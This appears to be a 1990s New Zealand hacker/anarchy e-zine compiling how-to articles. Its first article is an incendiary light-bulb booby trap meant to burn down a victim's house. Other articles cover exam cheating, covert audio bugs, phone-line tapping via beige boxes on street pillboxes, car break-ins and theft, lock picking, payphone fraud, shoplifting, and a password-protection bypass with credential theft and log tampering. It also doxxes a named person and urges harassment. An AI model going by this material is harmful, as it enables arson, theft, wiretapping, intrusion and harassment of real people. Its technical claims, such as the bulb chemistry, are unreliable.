                                BULB BURNER

---------------------------------by Posca!-----------------------------------
  
  This is probably one of the oldest and the most favourite methods for   
  arsonist to append. its the old bulb burner trick you will require... 
  
  100 watt bulb (75watt is o.k.)
  compressed diesel (from B.P.)
  Magnessium Chloride (MgCl²)
  1 mol/L Sulphuric Acid
  Drill gun with a 1/10 inch bit
  
  First, get the bulb and drill a hole between the metal connections as you
  can see the diagram below how its done.
  

  D1>               Hole         D2>        ____
                  /                        |####|
            .----/.                        :----:
           '    /  `                       :    :
          :  ()@()  :                     .      . 
           .       .                     .        .
            `-----'                     :          :
                                       .            .
                                       .            .
                                        .          .          
                                          . . . ..     

            
  Make a paper funnel suitable for the little hole. Place the funnel on  
  top where the hole is and pour 200ml of compressed diesel along with
  about 2-3 grams of Magnessium Chloride. Then after that put a table
  spoon of Sulphuric acid, this is the essential part of the burner as
  this provides a catalist reaction therefore making it a ready explos-
  ive. Putty up the hole with Black silly-putty. From now on make sure
  the bulb connections are always facing upwards SEE D2..
  Now Place the bulb in Victims room just by re-placing his light bulb
  with the bulb burner! MAKE SURE: the switch is off you dont wanna 
  kill ya self! Get away from the room descretly.
  
  Now when the victim turns on the light switch..the bulb will blow up
  and set the house in full blown flames!

                              CHEATiNG TESTS!

----------------------------------by HyPe-----------------------------------
  
                       CHEATING IN YOUR TEST/EXAMS  
                       ~~~~~~~~~~~~~~~~~~~~~~~~~~~
  1> Sniff in class continuesly until your teacher tells you to go out
     and blow your nose (make sure you have some notes in ya pocket for
     you to read when you get out class) Be quick tho!
     
  2> Listen to your walkman quietly (before the exam have some recorded
     notes on your cassette tape!)                      
     
  3> Have some notes (Main points - diagram's etc) on small pieces of   
     paper (keep them in your pencil case or pocket) - get em out
     quietly and read! make sure the person sittin near you doesnt see
     your notes, coz then they might nark!
     
  4> Stick a mirror to your palm of your hand then hold it up but do
     it as if you are holding your head.. hehe and if at all possible
     angle the mirror to the person on your left/right!
     
  5> Ask to go toilet.. If the teacher says 'no, why didnt you go b4?'
     then say 'I had cerial for breakfast and orange juice and i feel
     like im gonna chuck it up!' - if you act right you will make it
     no sweat out that door!
     
                 SWAPPING NOTES TO YA MATES IN TESTS
                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  1> Pass your calculator to ya mate..if the teacher finds it suspicious 
     just say your mate wanted to borrow it coz he/she forgot their's
     (Inside the calc put a piece of paper with the notes you wanted to  
     tell your mate!)
     
  2> Sit close.. pass papers to each other.. (best if sittin at the back!)
  
  3> In maths use your calculator with the memory option and just tell
     your mate how to use it to bring the last answer and bingo
     
  4> Whisper.. (SIT at the back)
  
  5> Put your test sheet on the side of the desk and get a nice piece of
     paper and pretend that the one on the side is a spare piece of refil
     
                      WHAT TO DO IF YOU GET CAUGHT      
                      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  1> DONT PANIC!
  
  2> just lie! dont tell the truth.. otherwise you will get majorly fucked
     for tryin to cheat!
     
  3> Say 'i did it to get out of the class' i needed to throw up' 
  
  4> Try and make the teach feel SORRY for you..
  
  5> Tell them you thought it was a open-book test (or some1 told you it
     was a open-book test) ..If the teacher is a reliever then they shall
     fall for the trick!
     
  Thatz it for cheatin test's... Some things explain'd here arent easy to
  do.. but with a bit of practice and skill shouldnt be a problem!

  You must carefully solder all components especially the surface mounts
  as they are very sensitive.
  You must use a very low heat soldering gun (15-30 watts) for these
  resistors as if the resistors heat up too much you would ruin them.
  All these components should be able to fit in a 3cm x 4cm veroboard.
  Once everything is put together make sure the coil is fairly spaced
  out with a very small gap between each turn. The coil is where the
  magnetic flux occurs and this determines the frequency to emit.
  You should be able to pick up the millibug on a FM radio at about
  88Mhz, if not play around with the coil just by shifting it a little 
  bit and it should pick up on this frequency.
  
  Once you got the bug going, put it in some ones bathroom and you can 
  tune in the radio and record someone having a crap!?!@#!     :)
  
  Ed: Hahah, i wouldnt put it in a bathroom myself.. rather stick it
      near the victims phone or under their dinner table! =] hehe

                             FONE CALLZ ON ViD
  
-------------------------------Posca + HyPe!--------------------------------
  
  Convenient, Versatile, Handsfree, Fone callz on video method!  
  All it requires is..
  
  Male Phono socket plug
  Male Telephone Plug
    
  For the telephone system in NZ hook up pins 2 and 6 from the 
  Male telephone plug to the Male phono socket plug...
  (Pin 2 on centre and 6 on ground within the phono socket)
  See Diagram below..
  
  
  Male telephone Plug                                 Male Phono Socket
            ___      pin2                       centre    ____
           =   |------------------------------------------|   |__
           =___|------------------------------------------|___|
                     pin6                       ground
  
  
  The wires can be as long as up to 2metres. We arent too sure about
  pin configurations for anywhere else overseas but we are pretty
  sure it would work as all you have to do is find out which two wires
  are for the phone line. If you are not using the telephone plug and
  decide to do it direct to your phone line make sure it is connected
  in parallel form, NOT in series!  
  ok once you got your plugs ready, just plug in the phono plug to 
  AUDIO IN in your tv or video and set what channel you like. 
  Now use your phone and you should be able to hear yourself on tv!
  You can tape your voice on video, or play around with Super woofer
  and get surround phone sounds in ya room!

  The SoNiK box is a way to listen on peoples phone linez without having
  to use a phone whenever you do pill boxing! 
  
  Its fairly simple to construct, You will need the following items...
  
      2 alligator clip wires     
  <a> Female mini headphone plug
  <b> Red LED (any colour ya want)
  <c> 330 ohms Varible resistor
  
  Ok, just basically wire all components as shown below..
  (See above to see what varibles are)
                       
                                               
    .------------<b>---------<c>--------------<===^ Alligator clip 1
    |
    |
    |
    `------------<a>--------------------------<===^ Alligator clip 2
    
  Once you have assembled the circuit above, you can put it in a match
  box, make sure you can easily turn the varible resistor and be able
  to plug in your headphones through the female socket. Bingo and thats
  your SoNiK box! 
  
  Basic instuctions are..
  
  Is that you treat it just the same as a biege box, but you're only
  able to listen with your headphones, and the person on the phoneline
  wont be able to hear you at all! :) you can adjust volume just by
  adjusting the varible resistor and the LED light is there to indicate
  that your hooked on the phoneline.
  
  Ed: This is a useful tool for pillboxing.. =8)

                              RiPPiNG OFF CARZ

-------------------------------by Kryptonite!-------------------------------

  There's many ways to break into cars depending on what the car is that
  ya gonna do over. When i started the game i was mainly into just
  honda cars as all ya need is a table fork. You get the two ends and
  bend them in then just use that as the key.

  Since then cars have been upgraded in securty a bit tho eh, so now you
  gotta get with the new class of car thief. You have to get the blue
  ropey thingees uzed to hold bunches of newspapers together. With these
  you bend them in half and slide it down the side of the window. Holding
  both ends ya just move it round till it catches on somfin then you pull
  it up. Nine times outa ten it's the lock that you pull up. Now you
  can just open the door. If your not looking for a joy ride then just
  check out all the car for $$ and don't forget to check unda the seats and
  unda any cloths.

  If you are planning on a joy ride then you need to have a screw driver.
  I read some other Anarchy mags before i wrote this so i had a bit of an
  idea on how to write it. In these mags i saw to do hot wiring. Let me
  tell ya fella's now, it duzn't fucken work, it's shit, everyone has tried
  it, and noone has done it.

  Anyway bak to the insturctions, you use the screw driver to unscrew all
  the screw around the egnition and stearing wheel and open it up and you
  shuld find a little fingee next to the key hole fingee and turn it, this
  will doing the same job as what the key duz, the car starts, and your
  off.

                                BREAKiNG iN!

-------------------------------by Kryptonite!-------------------------------

  Easy enuf really, this is just one of my many handy things that you
  can do with a table fork. You first select the fork, for this one
  you need a fork with four spikey thingees, and they need to be as
  thin and sharp as possible. You rip off three of them, and use the
  fourth one as your lock pikker. This trick is made mainly for the
  ranch sliding doors that most offices have. You shove the little
  thing into it and fiddle it around.  Eventaully it'll open up for
  you to go in.  Once your in the same key will usually pick the lock
  on the till too. If there's a padlock on the door then you just need
  a screw driver and just rip off the padlocks by shoving the screw dr-
  iver in the ring thingee.

                                GOLD PHONiNG

-------------------------------by Kryptonite!-------------------------------

  Theres quite a few articles going round on how to do this and after 
  trying all the techniques for ages I finally got it to work for me just
  yesterday, so I thougt, might as well let all you other dudes in on the
  secret.

  If you are not to sure on what Gold Phoning is, it's when you use the 
  small red pay phones and you play around with the buttons to get yourself
  a free call, thats right, no putting in money. Anyway, this is how I did
  it.

  You pick up the phone and then hold your finger on the follow on button
  (you know the button you press when you have credits left and you want to
  make another call)..then you push down on the reciever for about 10 secs 
  plus. If it's gonna work it will keep a tone, now you take your finger
  off the follow on button, and dial away. I have been warned that it does- 
  nt work on some phones due to the follow on button being disable. Plus I
  have tried the technique about 25 times and only once didnt get it to  
  work. Other techniques that didn't work for me where keeping your hand on 
  the hook.

  Oh and when It did work for me, the mate that I called up said that the 
  reception was really bad.
  Hope it workz for you.

                                 CELL FONEZ

-------------------------------by Kryptonite!-------------------------------

  Well, this is just a pretty logical basic article on a method of free calls
  that a mate of mine told me and claimed he had done it. It does work, it's
  just I bettcha the dude who told me about it hadn't done it :) .. 

  All it involves is buying a stolen cell phone from a black market near you
  or if you have criminal contacts. The phone rental takes one month before
  you can close it so if the cell phone is within one month of being stolen
  then you can make as many calls on it till the month is over and all of the
  tolls get charged to the owner of the cell phone. When the month is over 
  and he's cut off the rental of the phone then you take it to the police and
  say you just found it and your likely to get about a $20 + reward for it.

  Pretty easy eh?. Well I though so but I still can't find someone to sell me
  a stolen mobile phone, hope you have better luck. Oh, and my mate reckons
  his one cost him $75.. So you still get a bit of a cost for the calls but
  if you're smart you'll make a good amount of tolls all nite and day.

                               HiT BY TROJANZ

-------------------------------by Kryptonite!-------------------------------

 Around New Zealand at the moment theres a huge amount of trojans going round
 and most of them are made by the same person. You've probably heard of him,
 known as Merlin, and with thousands of other id's. I don't really wanna go
 and name them all as I owe him a favour.  But in this article I'll give ya
 most of his id's, a short story of his trojan life, and how to stop him.

 He first started using the handle Merlin for his trojans, after having an
 identity change from Nostradamus. He now uses - Merlin, Psycho therapist,
 KOD3, and Ace.

 He also uploads most of his trojans using other peoples accounts, such as
 Gambit - using the password of either PLUME or PISSANT. And he logs on as
 people who he aint before they logon to boards. Such as his logging on as
 Homicide! to about 5 public Auckland boards.

 His first main trojan was "Phun mag"..and electronic hpa magazine that is
 meant to have many kewl properties such as back doors to Remote Access.  
 This Trojan took out Maximum Carnage, The Tinny House, and Adrenilan Over-
 dose. Quite a failure really considering the purpose in the trojan was to 
 take out High Voltage.

 The trojan was poorly made with just a bat to com file and was easy to 
 identify due to the extreme smallness of the trojan.

 Then he upgraded himself a bit as he planned to code an ultimate trojan in
 Pascal and was to format your hardrive in less than 1 and a half seconds.
 As he worked on this trojan there was another trojan being made by "Slain"
 that was a member of Merlin's Lords Of Destruction. This trojan was another
 not so well made trojan that was kalled "kracker.zip" and was meant to 
 register all doors and programs for you. This trojan managed to take out
 Sepultura and a few modemers but nothing to major.

 Finally Merlin had finished his best trojan yet. Searches and formats all
 you disk drives and does it all in less than 2 seconds. It was made to be
 a game, "HELL" This took out a few modemers and Tinny House and Maximum
 Carnage (again!). However Maximum Carnage had learnt something after the 
 first trojan and had all his files backed up, Tinny House was not so lucky.

 So how do you stop this loser or some other loser thats making these hdd
 killers?.. Its quite simple really, download a file called UNP or something,
 and use it to remove the protection on it, then use a good hex editor to
 look thru the file first. I recomend Hexscaliber or Hacker View. Or even
 keep a back up every nite run by an event or something so that all your 
 stuff is backed up onto a tape drive or something.

 Oh, and the big question, whats this dudes real name, scene as every body
 wants to kill the guy I though I'd be carefull on what stuff I give out bout
 him as sometimes it's the family the get punished more by prank calls to him
 all the time, or people lighting his house on fire. So I'll give you this,
 he's a member of Auckland Institute of Technology and is about 18 years old.
 He is an ex pupil of Selwyn College and real name is B. Jack. You figure 
 the rest out for yourself.  
  _______________________________________________________________________
 |ED: hehe, this merlin dewd is bad! there was a trojan called NZTONE.ZIP 
 |that he designed.. it was supose to give you free calls from nz to any-
 |where in the world, i upped it to morpheus since i couldn't get it to
 |work on my 286 (cheap) laptop and then morph called me up tellin me the 
 !tone file killed half of the filez on his HD! hehehe

----=(iNTRO)=---------------------------------------------------------------

Alot of small businesses and home users of the ugly peecee type computers use
a proggy called Direct Access! (WoW)  This is basically a menu system that
also provides password protection for your computer by a logon GUI, when the 
right login names/passwords have been entered it logs you on and will display
a menu of the available options.  The reason why this particular program is 
used alot is, because it is very easy to install, to maintain and keep the 
average computer user out of there system. 

I will tell you how to majorly fuck these people off with simple instructions
on how to hack and get around the password protection.  

The reason why i started fucking around with it was i wanted to gain access
to (hmm lets call the person BITCH) Bitch's computer, although i already had
access to the system, i didn't have the particular password to windows so i 
couldn't play the games!


----=(hOW i hACKED dIRECT aCCESS)=------------------------------------------

After installing direct access onto a peecee i start to fuck around 
with it... first of all i did a 'dir' of the direct access directory and made
a note of all the filez and sizes.  Then i put some passwords on the options 
and made a few login accounts and passwords for them.  after saving the 
configuration i did another 'dir' and checked to see if any file sizes had 
changed.  Fuck none had.  So then i studied all the filez and guessed which 
one/s would most likey be data filez.  after about 2 minutes i guessed that
'menu.cnf' was the password data file (althought the name suggests something
else.  so then i made a directory and moved that file to the new directory.
then i rebooted the computer and sure enough no logon gui or passwords came 
up (kewl!).  but thats all very well having access to dos through the main 
menu, but on the bitchs menu configuration the option to go to dos is 
passworded (shit).  but i thought of a way around that so i could get into 
dos.. terminate batch job and then i will get a dos prompt so i then can do
my stuff! hehehe... The fucken lame arse's at delta technology who wrote
direct access should feel so fucken stink as i hacked this mutha in 10 mins!
fuck and that was my first attempt at it to!


----=(hOW tO hACK tHE bITCH!)=----------------------------------------------

1)  While the computer is booting hold down the key 'CTRL' and hit the key 
    'PAUSE' (underneath PAUSE on the verical side of the key are the words
    'BREAK') several times until the computer says 

    Terminate batch job (Y/N)? 

    hit 'Y' for yes and then you will get a dos prompt, you will most likey 
    get a 'C:\>' prompt as nearly all hard drives these dayz are called 'C' 
    drive.


2)  Once in dos type 'cd DA5' and you should be in the direct access 5 
    directory. if not the person who installed it must think they are smart
    and they probably installed it in another directory or under a different
    name!  if that is so type this 'dir c:menu.cnf /s /b'.  Now the computer
    will search the whole of c: for a file in the direct access directory.
   
    After you have typed that line (you may need to change the name of the 
    drive if they have formatted the hard drive under a differnt name eg d:)
    a path/filename will be displayed eg: 'C:\UTILS\DA5\MENU.CNF', make a 
    note of it and 'cd' into that directory. (make sure you only type 
    'C:\UTILS\DA5' in this partcular case, as you will fuck up if you include
    the filename 'menu.cnf'


3)  Now you are in the Direct access 5 directory type the following 'MD SHIT'
    the computer will now make a directroy called shit.  now type 
    'MOVE MENU.CNF SHIT' now the computer will move the file 'menu.cnf'
    into are new directory.
 
    now you can reboot the computer and no password bullshit will come up
    and you can now access the whole system.


----=(oNCE yOU aRE iNSIDE tHE sYSTEM)=--------------------------------------

Now do not stay to long in here becuase you don't want to be caught red handed
unless you know for sure the person whos computer you are hacking won't be 
back for an hour or 2.

do the following things for future access to there system without having to
go through this whole process again.


=> How to obtain your own login account:


1)  go into maintance by hitting the key 'F1' and now a new menu with four 
    options will appear.
    
2)  Hit 'C' and then 'F2'

3)  Now you will get a list of users, the title is 'VALID USER NAMES'.  use 
    the cursor (arrow keys) to select a name from the list and then once 
    selected hit 'F8' and now the password will be displayed!

4)  Make a note of the user name you selected and the password to that 
    particular login, so you can use this login account for future access.

5)  once you have finished hit ESC to go back to the main menu.  If the proggy
    asks you to 'save' configuration hit 'N' for no as you must have changed
    the data while finding out passwords and you don't want it changed as the
    owner of the system will know someone has been sn00ping around!


=> How to find out the passwords to password protected menu options:


1)  Go back into the maintance menu, by hitting 'F1' from the main menu.

2)  Hit 'A' and now a new configuration screen will be displayed.

3)  This new screen will have a list of all the menu options (you will prob-
    ably reckonise them).  with the cursor select one of the program names 
    (eg. select the menu option such as WINDOWS), i mean the ones that have 
    passwords, Hit 'F8' once selected and then the password will be displayed.
    make a note of this.

4)  when you have got all the passwords you won't hit ECS a few times until
    you are back to the main menu.


----=(oNCE yOU hAVE fINISHED fUCKING aROUND)=-------------------------------
   
1)  Go back into dos (hit 'F10' from the main menu to get into dos) and cd 
    into the direct access directory (remember i told you how to find the
    directory and told you to make a note of it earlier on!!!!)

    then type 'MOVE C:\DIRECT ACCESS PATH\SHIT\MENU.CNF C:\DIRECT ACCESS PATH' 
    here is an example below:
 
    'MOVE C:\DA5\SHIT\MENU.CNF C:\DA5'

    What this does is 'moves' the password data file back into the direct 
    access directory so when you reboot all the password prompts come up and
    everthing looks like normal. 

2)  Then type 'RD SHIT'.  this will delete the directory we made earlier on 
    that we used to store the password data file 'MENU.CNF'

3)  YOU NOW MUST REBOOT OR TURN THE COMPUTER OFF!!!!!!  DO NOT DO ANYTHING 
    ELSE!!!  if you want to re-logon read the shit below as a tracking option
    built into the software could be watching and recording your every move 
    once you have copied the password data file back into the directory!

    
----=(iF yOU wANT tO lOG bACK iN)=------------------------------------------

if you want to go back into the system the best way is to login with someones
account (remember i told you to find out what the login names were and to take
down the passwords?), use one of the USER NAMES and PASSWORDS to gain access
to the computer.

once you have successfully logged in do whatever the fuck you want!  

if you decide to logon again a few weeks later and you can't because all the 
passwords have been changed you will have to hack them again!


after you have finished screwing around you need to check to see if the owner
of the computer has set the 'Usage Tracking' option ON!  if it is on all your
moves have been recorded to a file and if the owner looks in that Log they
can tell that you have logged on and what you have accessed. So this means
you have to delete these records, i will tell you how in the next section. 


----=(hOW tO eDIT tHE uSAGE tRACKING lOG)=----------------------------------

Some people use the option of tracking all users moves and actions, they do 
this either becuase they are nosey or to keep a sense of (lame) security of  
what MR USER has been doing and to see if anybody has been trying to logon
as other users and try to guess their passwords.

now we must see if the usage tracking flag/option has been set by the follow-
ing method.


1)  Go back into maintance (You should know by now that you do that by hitting
    'F1' from the main menu) and once in there hit 'C' for PROGRAM 
    CONFIGUARTION.

2)  once in the PROGRAM CONFIGUARTION configuartion screen look near the bottom
    of the screen for the following line/option


    Usage Tracking........................................................[  ]  
                                                                            ^
                                                                            |
    in the little box at the end of the line will either be the     ->--->--'
    word 'off' or 'on'.  If it is set to OFF you are lucky as they 
    don't have the tracking option on so you can just leave the system 
    un-detected (KeWL), otherwise if the option is 'on' we have a bit of work
    to do!  


----=(eDITING tHE uSAGE lOG)=-----------------------------------------------

once we have found out that the flag has been set we need to edit the
apropiate file and remove our actions/moves


1)  go into dos and type 'EDIT' this will load up the edit program that comes 
    with MS-DOS.

2)  now once in the editor program select OPEN program and then open the file 
    'USAGE.LOG' in the Direct Access directory!

3)  after it has been loaded you will probably get a list of shit like this
    Note: this is only a cut of a log, the real thing will probably be a few
          pages long.

 
          BOB       V5.0 Creation Date     14/05/95NONE             9

4)  the basic format of this log is this:

????      USERNAME  ACTION THEY DID      LOGON/LOGOFF DATE   LOGON/LOGOFF TIME
  
     
5)  say that we logged on as the user hacker (as we can see in our above log) 
    and we went into qbasic and dos, we can see that our actions have been 
    recorded. just move the cursor keys around and delete our records

6)  an example of the above list after we have deleted all recorded actions.

Have you ever got a text file on pill-boxing that is fucken technical,
crap or doesn't explain things in enough detail???? well here is your answer.

I am writing this for you mutha fuckers who wanna 
learn to have fun and also this is an easy way to start phreaking.  In this 
guide i will tell you how to do everything from making a begie-box and
wiring it up to the pill-box and making some callz (for you fucken big lamers
i will explain what a pill-box and begie box are!).

NOTE: To all of you experienced HP^ dudez who think that pillboxing is lame 
      and old, who cares!!!! it is the easist way for newbies to learn to 
      phreak safely and i bet you that you have been pillboxing before when 
      you just started out.


----=(mY gUARANTEE)=--------------------------------------------------------

i guarantee you that this is a complete guide of how to pill/beige box, 
everything contained in here really works unlike some articles that look good
and when you go to try them they don't fucken work! please enjoy my hours of
typing and remember i am not responisbe for you getting into trouble....

What is a pill-box?
      
       A pill-box is one of those grey bits of pipe about half a meter high
       Sticking out of the ground near every 3rd house or so and has Telescums
       name stuck over it in black! some of them have a sticker which says
       something like 'you will be prosocuted if caught tappering with the
       network!'.  Inside these wonderful things are heaps of fucken wirez 
       Which i will later tell you how to connect your beige box to.

What is a begie box?     

       A beige box is an adaptor which enables you to connect a normal
       phone into the wirez of a pill box.  It is very simple and doesn't 
       require any electronic knowledge to make!

1 Phone extension socket - you know those little white boxes that you plug
                           your phone into? It doesn't matter if you get a
                           Master or extension socket. a master socket
                           contains a few capcitors and shit, and if you use
                           one of these you can hear if  call is coming 
                           through the line, by a ringing sound of course!
                           but with an extension socket you can't.

                                            
2 lengths of wire - make sure they are differnt colors so you can tell them 
                    appart at a glance.  make them about 2 meters long each.
                    
1 soldering iron and solder  (not neccessary, i'll tell ya how to get away 
                             without having one)

2 alligator clips - you can get these fuckers from dicksmith electronics
                    just ask for them by name, if you don't know what the
                    fuck they are then fuck off and delete this file!

1 flathead or philipshead screwdriver

1 pair of pleirs

electrical tape


----=(hOW tO mAKE a bEGIE bOX - mETHOD)=------------------------------------

Open the extension socket with a screwdriver, you do this by unscrewing the 
screws that hold the box together. you will see a brown or green piece of
PCB board (PCB is just a fucken name for the bitch), right in the middle is 
the socket were the phone normally goes into.

Above it on the left and right
are 2 blocks which have 3 cuts in them and beside the cuts on the PCB board
are numbers 1 to 6, 1-3 on the right hand block and 4-6 on the lefthand side,
as showen in the above diagram.
Get one bit of wire and put it between the cut/slot which has the number '2'
beside it.  you know in a fruit shop how when the dude seals the bag by 
putting it in between that device and it comes back out with the tape around
it all nicely sealed off?  use that same action to put the wire into the slot
but leave it in there for a nice secure easy connection. now get the other 
piece of wire and put it into the slot with the number '5' beside it.

Now on the other half of the box, the back part which you screw
the piece we have just been playing with onto.  Look at it and you will see
2 holes drilled right through it (i'm not taking about the holes which the
screws go into,  if there are none, drill a hole into the case about 5 mm in
diameter).  Thread the wirez through the holes in the back of the case, and 
then screw the extension socket back together.

You will now have an extension socket with two wirez sticking out the back of 
it. With the pair of pliers strip the ends of the wire to remove the plastic
insulation and expose the metal wire.  Now take one of the aligator clips and
connect it to one of the wirez. the best way to do this is to thread the wire
through the hole in the clip (the hole is on the end of it,  it maybe covered
by the plastic surrounding the top half of the clip, just pull back the 
plastic and thread the wire through).  thread it through
a couple of times and/or twist the wire together to make a nice connection. 
Now get a piece of electrical tape (or similar) and wind it around the wire
where you have connected it to the aligator clip so it holds the wire to the
clip. (Soldering the connection is better as you have a good solid connection 
holding the wire to the clip.)  now do the same to the other piece of wire.

Ok if you have successfully done that you have your beige box.  


----=(hOW tO mAKE a bEGIE bOX - aDVANCED mETHOD)=---------------------------

To make this more compact and less bulkier beige box you will need to have
some experience in simple electronics and have to know how to use a soldering
iron confidently!

open the extension socket with a screw driver and take the half of the box 
which has the PCB board attached to.  unscrew the PCB board from the white 
plastic extension box.

look at the number '2' slot in the block and turn the PCB board over and see 
where the number '2' pin is soldered into the PCB baord.

follow the circuit that it is soldered on until you reach the pins from the 
phone jack. now keep a mental note of where it is positioned and turn the
PCB board over again and note which pin from the modular jack is solidered
onto the circuit with the '2' pin.  mark it some how, with some paint/pen
etc!!

you might have to flip the PCB board over a few times to make exactly sure
you have the correct pin from the modular jack.  

Now do the same thing with the number '5' slot and mark that pin from the 
modular jack.


here are the number '5' and '2' pins already marked out for you but check
them just in case some strange reason they are different!

now cut out the modular jack from the PCB board, i did this with a pair of 
wire cutters and clipped the PCB board away from it.  now desolder or clip/
cut the pins from the modular jack out of the PCB board to free it completly.

now strip 5-10 mm of plastic insulation from one of the wires and solder it
to the number '2' pin and with the other piece of wire do the same to the
number '5' pin!

now tape the pins and wire with the electrical tape to seal everything off 
nicely.

now solder the aligator clips onto the 2 wirez.  pull off the plastic 
insulation from the aligator clip and you will see a 1 mm hole at the top
which you can insert the wire in.

well that is it and now you have your begie box!!!! yeah, now you just need
to know how to connect it to a pill-box!


----=(nOW yOU nEED a pHONE)=------------------------------------------------

the best type of phone to use is one that is just a handset ie: it has the
buttons in between the speaker and microphone (i mean the piece you hold up
to your ear).  You can get these suckers from 'the warehouse, were everyone
gets ripped off' for about $20.

When you actually go phreaking you plug the phone into the 'beige box' we
just made up (like you would normally plug the phone into the wall)


----=(hOW tO fIND tHE bEST pILL bOX tO pHREAK fROM)=------------------------

when you are walking home from school (if you don't go to school go for a walk
every night) look at every single pill box on the way home and when you see
one look around to see how close it is to the house and if there are any thick
bushes around it for hiding in/under.

Never pick one while you are new to this that is on a main street!

The best sight to phreak from is on a little street that is really dark at 
night and has heaps of trees in it.  its good if the trees are in front of 
the house so it makes it hard for people in the house to see you if they look
out the window. a bush beside the pill box is good as you can hide behide it,
so no cars that might go past can see you easily.

here is a birds eye view of a good sight..

This kind of setup is hard to find but when you do you will be laughing!

Once you think you have found your ideal setup, every day for about a week
when you are walking home look at it and think of all the ways you can be
seen. Also think of how you might get caught from there if the pigs or Tele-
scum decide to drive past. if you think of too many wayz then find another
spot.

Once you have found the perfect/good spot you have done most of the hard work.


----=(wHEN iS iT bEST tO gO pILL bOXING?)=----------------------------------

Night time of course.  Pick a night that is right for you ie: warm, no wind
etc You can feel if it is a good night for you or not.  Once you have choosen
a good night, you should go out and do your stuff between these hours 1am-4am,
these are the best as most people are in bed asleep at this time, and they 
won't be on the phone or likey to pick it up and find some dudez on there
line and phreak out!


----=(oN tHE nIGHT oF mISCHIEF!)=-------------------------------------------

just before you leave get a bag and put your :-)


* beige box
* phone
* paper & pen
* some phone numbers (contactz, o9oo's etc)
* philipshead screw driver
* flathead screw driver
* 7/16 inch hex driver (allen key)
* craft knife
* tourch of course!


into the bag and now we are ready to jump out the window or something.


----=(oNCE yOU hAVE eSCAPED!)=----------------------------------------------

take a nice walk to your selected site to do the phreaking from and jump 
into/under/behind the bushes where the pill-box is in reaching distance.

use the philipshead/flathead/hex key to unlock/undo the pillbox, if you are 
lucky most of them aren't screwed down so you can just rip the tops off em 
so you can see the wirez. 

what a fucken mess! there are hundreds of wirez! hahaha well i will tell ya
how to connect your beige box to the right ones!


----=(wHICH wIREZ dO i cONNECT tHE bEGIE bOX tO!!)=-------------------------

ok look in between the wirez for a black cable which is about 5 mm thick.
there will be big black cables about 15 mm thick as well, but these aren't
the ones we will use!

once you have found a 5 mm thick cable (there could be only one or 3-4 of
them but anyone will do!) look at the top of it were the 1mm wirez are coming
out of it.

there should be a total of 4 wires coming out the top of it and these will
be wired in pairs ie:  2 out of the 4 wirez will be connected together with
a clear plastic cap, and the other two will also be connected with a plastic
cap.

here is an example of what i mean:-)


here is a sectional diagram.. which is easier to understand

check out the gif picture included in the ToT archive!


now once you have found a cable like this you will need to cut some insulation
off both of the paired wirez to expose the metal/wire, the best way to do this
is to use the craft knife and slice a section out.  I mean, cut some plastic
insulation off the OO or 00 wire (the OO and 00 wirez are represented in the
above diagram), only strip one of the wirez. It doesn't matter which one as
they are both connected together with that clear plastic cap. also only cut 
about 1cm strip off the wire (just enough to put the aligator clip onto) as 
shown below.

Now strip some insulation off the other set of paired wires.


----=(cONNECTING tHE bEGIE bOX tO tHE cABLE)=-------------------------------

if you haven't already guessed you clip one of the aligator clips onto one of 
the paired wirez and the second aligator clip to the other paired wire.

make sure you have the phone plugged into the beige box and then pick the 
handset (phone) up and listen to see if you have a dial tone.  if you don't 
just hang the phone up and then pick it up again (ie: a hook-flash)  and 
listen to see if you have a dial tone.

still no tone???? well all you need to do is swap the aligator clips around!

make sure that the aligator clips aren't touching each other once connected
otherwise you will get heaps of static down the line.

NOTE:  if you still don't have a dial tone after you have swapped the wires 
       around and done a hook-flash then goto another pillbox as for some
       strange reason it could be fucked!  

       you have got serious problem if you still don't get a tone from 
       another pill-box!  if this happens check the connections in the beige
       box and check to see is you have connected the aligator clips on to 
       the exposed metal of the wire properly.


----=(oNCE yOU hAVE a dIAL tONE)=-------------------------------------------

eNJoY!!!!!  remember only use it for a maximum of 10 minutes just in case some 
neighbours happen to look out the window and see someone fucking around with 
the pillbox and they might happen to ring the pigs/telecum, and you don't want 
to get snapped on your first time!!!

i know someone who got caught because he had been on the pillbox for over 1/2 
an hour and the owners of the phone line picked the phone up (at 2am in the 
morning) to use it and they found him on the other end talking to one of his 
m8's.  they hung the phone up and looked out the window to see a human figure
cruching beside a bush and the husband went out side and nearly bet him up
while the wife called the cops around!

he was quite lucky as he only had to pay the $150 bucks worth of toll callz 
and had to write a written apology to the owners!


----=(tHiNGS tO dO!!)=------------------------------------------------------

1)  use the line to keep in touch with contactz for free... if you know how to 
    blue-box or something, save the blueboxing for the modem callz and use 
    pill-boxing to keep in vox (voice) contact with them.

2)  ring up your enemy / telephone operator etc. and abuse and/or sexually 
    harass them.  if telco decides to trace the call you don't get in trouble
    but the owners of the phone-line will! hehehehe 

3)  i don't reckomend that you ring up 111 and make false reports, as this is 
    fucken stupid becuase while a few amblances/cops etc are racing off to a
    bullshit call some other REAL call might come in and there migth not be 
    enough cops/fire/ambulance units around to save them and it would be all
    your fault if someone died!!!!!!!!! DON'T DO IT!!!!!!!

4)  if you are lucky enough to have a laptop use that and your modem to make 
    big expensive overseas callz.

5)  anything you want / ever dream of that you wouldn't dear do on your own
    phoneline from the fear of being traced!!!


----=(pHUQ'iNG eMEMIES oVER)=-----------------------------------------------

has someone really pissed you off and you want to get back at them???? i mean
do you really want to fuck them over????  well i'll tell you how to do this!!


eRR umm... due to the fact that Hype wanted to release ToT i have to leave 
this section out! but don't worry you should have had enough pratice to be
able to do it when i release aDVANCED pILLBOXiN in the next issue of T.o.T


----=(tHE eND)=-------------------------------------------------------------

well that is it for this part for the complete lamers guide to pillboxin and
look out for advanced pillboxing which will feature...

rewiring the pillbox
fucking people over badly!
pillbox fun (what to do if you get thrown out of a party early!)
 

see ya l8r...

----------------------------------by HyPe!----------------------------------

  I thought of this when i went shoppin in Countdown a few dayz ago..
   
  1> Get a trolley..
  2> Fill it up (half full - no more)
  3> Now find an empty checkout and leave ya trolley there..
  4> Grab 2 or 3 thingz out of the trolley
  5> Then pay for it at a different checkout..
  6> Get lots of plastic bags and start fillin up with food!! etc
  7> Then quickly walk out without turning around etc
    
  This actually werkz! I did it with over $30 of food/groceryz!
  Try it!!!

----=(iNTRODUCTION)=--------------------------------------------------------

Most of the elite pir8 amiga bauds use the software aMIxPRESS or for short /X.
If some one pisses you off in the pir8 scene and you want to get them back, you
can write some fake mail under there name to make them look lame... 

